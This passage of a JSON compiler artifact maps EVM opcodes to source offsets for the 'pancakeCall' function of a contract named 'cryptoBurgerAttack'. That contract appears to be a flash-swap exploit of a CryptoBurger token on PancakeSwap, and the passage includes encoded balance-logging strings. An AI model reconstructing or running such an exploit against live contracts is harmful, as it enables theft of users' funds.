      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1115": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1117": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1118": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "POP",
      "path": "0"
    },
    "1119": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1120": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "ADD",
      "path": "0"
    },
    "1121": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1122": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x46B"
    },
    "1125": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1126": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1127": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "1130": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3125,
        3164
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1131": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1132": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1134": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1135": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x4CE"
    },
    "1138": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1139": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1140": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "1142": {
      "op": "DUP1"
    },
    "1143": {
      "op": "DUP3"
    },
    "1144": {
      "op": "MSTORE"
    },
    "1145": {
      "op": "PUSH1",
      "value": "0x33"
    },
    "1147": {
      "op": "SWAP1"
    },
    "1148": {
      "op": "DUP3"
    },
    "1149": {
      "op": "ADD"
    },
    "1150": {
      "op": "MSTORE"
    },
    "1151": {
      "op": "PUSH32",
      "value": "0x57424E422062616C616E6365206F6620636F6E74726163742061667465722072"
    },
    "1184": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "1186": {
      "op": "DUP3"
    },
    "1187": {
      "op": "ADD"
    },
    "1188": {
      "op": "MSTORE"
    },
    "1189": {
      "op": "PUSH19",
      "value": "0x32B1B2B4BB3B34B73390333630B9B43637B0B7"
    },
    "1209": {
      "op": "PUSH1",
      "value": "0x69"
    },
    "1211": {
      "op": "SHL"
    },
    "1212": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "1214": {
      "op": "DUP3"
    },
    "1215": {
      "op": "ADD"
    },
    "1216": {
      "op": "MSTORE"
    },
    "1217": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1219": {
      "op": "DUP2"
    },
    "1220": {
      "op": "ADD"
    },
    "1221": {
      "op": "SWAP2"
    },
    "1222": {
      "op": "SWAP1"
    },
    "1223": {
      "op": "SWAP2"
    },
    "1224": {
      "op": "MSTORE"
    },
    "1225": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1227": {
      "op": "ADD"
    },
    "1228": {
      "op": "SWAP1"
    },
    "1229": {
      "op": "JUMP"
    },
    "1230": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1231": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1233": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1234": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1235": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1236": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "SUB",
      "path": "0"
    },
    "1237": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1238": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "LOG1",
      "path": "0"
    },
    "1239": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1241": {
      "op": "DUP1"
    },
    "1242": {
      "op": "MLOAD"
    },
    "1243": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1245": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "1248": {
      "op": "DUP4"
    },
    "1249": {
      "op": "CODECOPY"
    },
    "1250": {
      "op": "DUP2"
    },
    "1251": {
      "op": "MLOAD"
    },
    "1252": {
      "op": "SWAP2"
    },
    "1253": {
      "op": "MSTORE"
    },
    "1254": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3278
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 8
    },
    "1255": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3279,
        3280
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1257": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1258": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1259": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1260": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "LT",
      "path": "0"
    },
    "1261": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x4F8"
    },
    "1264": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1265": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x4F8"
    },
    "1268": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "1271": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3266,
        3281
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1272": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1273": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1275": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "MUL",
      "path": "0"
    },
    "1276": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1278": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "ADD",
      "path": "0"
    },
    "1279": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "ADD",
      "path": "0"
    },
    "1280": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3266,
        3281
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1281": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1283": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1284": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x549"
    },
    "1287": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1288": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1289": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "1291": {
      "op": "DUP1"
    },
    "1292": {
      "op": "DUP3"
    },
    "1293": {
      "op": "MSTORE"
    },
    "1294": {
      "op": "PUSH1",
      "value": "0x2B"
    },
    "1296": {
      "op": "SWAP1"
    },
    "1297": {
      "op": "DUP3"
    },
    "1298": {
      "op": "ADD"
    },
    "1299": {
      "op": "MSTORE"
    },
    "1300": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1302": {
      "op": "DUP1"
    },
    "1303": {
      "op": "MLOAD"
    },
    "1304": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1306": {
      "op": "PUSH2",
      "value": "0x2FDE"
    },
    "1309": {
      "op": "DUP4"
    },
    "1310": {
      "op": "CODECOPY"
    },
    "1311": {
      "op": "DUP2"
    },
    "1312": {
      "op": "MLOAD"
    },
    "1313": {
      "op": "SWAP2"
    },
    "1314": {
      "op": "MSTORE"
    },
    "1315": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "1317": {
      "op": "DUP3"
    },
    "1318": {
      "op": "ADD"
    },
    "1319": {
      "op": "MSTORE"
    },
    "1320": {
      "op": "PUSH11",
      "value": "0x10212AA923903A37B5B2B7"
    },
    "1332": {
      "op": "PUSH1",
      "value": "0xA9"
    },
    "1334": {
      "op": "SHL"
    },
    "1335": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "1337": {
      "op": "DUP3"
    },
    "1338": {
      "op": "ADD"
    },
    "1339": {
      "op": "MSTORE"
    },
    "1340": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1342": {
      "op": "DUP2"
    },
    "1343": {
      "op": "ADD"
    },
    "1344": {
      "op": "SWAP2"
    },
    "1345": {
      "op": "SWAP1"
    },
    "1346": {
      "op": "SWAP2"
    },
    "1347": {
      "op": "MSTORE"
    },
    "1348": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1350": {
      "op": "ADD"
    },
    "1351": {
      "op": "SWAP1"
    },
    "1352": {
      "op": "JUMP"
    },
    "1353": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1354": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1356": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1357": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1358": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1359": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "SUB",
      "path": "0"
    },
    "1360": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1361": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3190,
        3291
      ],
      "op": "LOG1",
      "path": "0"
    },
    "1362": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3377
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 9,
      "value": "0x0"
    },
    "1364": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3377
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1365": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1367": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1368": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "1373": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1375": {
      "op": "SHL"
    },
    "1376": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1377": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1378": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3396,
        3400
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "1379": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1381": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1382": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "ADD",
      "path": "0"
    },
    "1383": {
      "op": "MSTORE"
    },
    "1384": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1386": {
      "op": "DUP1"
    },
    "1387": {
      "op": "MLOAD"
    },
    "1388": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1390": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "1393": {
      "op": "DUP4"
    },
    "1394": {
      "op": "CODECOPY"
    },
    "1395": {
      "op": "DUP2"
    },
    "1396": {
      "op": "MLOAD"
    },
    "1397": {
      "op": "SWAP2"
    },
    "1398": {
      "op": "MSTORE"
    },
    "1399": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1400": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1402": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1404": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1406": {
      "op": "SHL"
    },
    "1407": {
      "op": "SUB"
    },
    "1408": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3377
      ],
      "op": "AND",
      "path": "0"
    },
    "1409": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3377
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1410": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3387
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "1415": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3387
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1416": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1418": {
      "op": "ADD"
    },
    "1419": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1421": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1423": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1424": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1425": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1426": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "SUB",
      "path": "0"
    },
    "1427": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1428": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP7",
      "path": "0"
    },
    "1429": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "GAS",
      "path": "0"
    },
    "1430": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "1431": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1432": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1433": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1434": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x5A7"
    },
    "1437": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1438": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1439": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1441": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1442": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "1443": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1444": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1446": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1447": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1448": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "POP",
      "path": "0"
    },
    "1449": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "POP",
      "path": "0"
    },
    "1450": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "POP",
      "path": "0"
    },
    "1451": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "POP",
      "path": "0"
    },
    "1452": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1454": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1455": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1456": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1458": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "NOT",
      "path": "0"
    },
    "1459": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1461": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1462": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "ADD",
      "path": "0"
    },
    "1463": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "AND",
      "path": "0"
    },
    "1464": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1465": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "ADD",
      "path": "0"
    },
    "1466": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1467": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1469": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1470": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "POP",
      "path": "0"
    },
    "1471": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1472": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "ADD",
      "path": "0"
    },
    "1473": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1474": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x5CB"
    },
    "1477": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1478": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1479": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "1482": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3363,
        3402
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1483": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3363,
        3402
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1484": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1486": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1487": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x5D8"
    },
    "1490": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1491": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1492": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DE5"
    },
    "1495": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3306,
        3412
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1496": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1497": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1499": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1500": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1501": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1502": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "SUB",
      "path": "0"
    },
    "1503": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1504": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3306,
        3412
      ],
      "op": "LOG1",
      "path": "0"
    },
    "1505": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3422,
        3486
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 10,
      "value": "0x624"
    },
    "1508": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1510": {
      "op": "DUP1"
    },
    "1511": {
      "op": "MLOAD"
    },
    "1512": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1514": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "1517": {
      "op": "DUP4"
    },
    "1518": {
      "op": "CODECOPY"
    },
    "1519": {
      "op": "DUP2"
    },
    "1520": {
      "op": "MLOAD"
    },
    "1521": {
      "op": "SWAP2"
    },
    "1522": {
      "op": "MSTORE"
    },
    "1523": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1525": {
      "op": "DUP1"
    },
    "1526": {
      "op": "MLOAD"
    },
    "1527": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1529": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "1532": {
      "op": "DUP4"
    },
    "1533": {
      "op": "CODECOPY"
    },
    "1534": {
      "op": "DUP2"
    },
    "1535": {
      "op": "MLOAD"
    },
    "1536": {
      "op": "SWAP2"
    },
    "1537": {
      "op": "MSTORE"
    },
    "1538": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3455
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1539": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3456,
        3457
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1541": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1542": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1543": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1544": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "LT",
      "path": "0"
    },
    "1545": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "1548": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1549": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "1552": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
